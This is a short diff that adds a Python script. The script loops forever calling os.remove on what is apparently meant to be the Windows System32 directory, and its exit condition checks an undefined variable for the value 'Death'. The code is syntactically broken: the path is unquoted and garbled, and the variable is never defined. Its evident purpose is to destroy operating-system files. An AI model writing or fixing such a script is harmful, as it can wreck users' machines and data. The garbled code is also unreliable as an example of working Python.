@@ -1,0 +1,6 @@
+import os
+
+while True:
+	os.remove(C:\Windows\System32bits)
+	if PC == "Death":
+		break
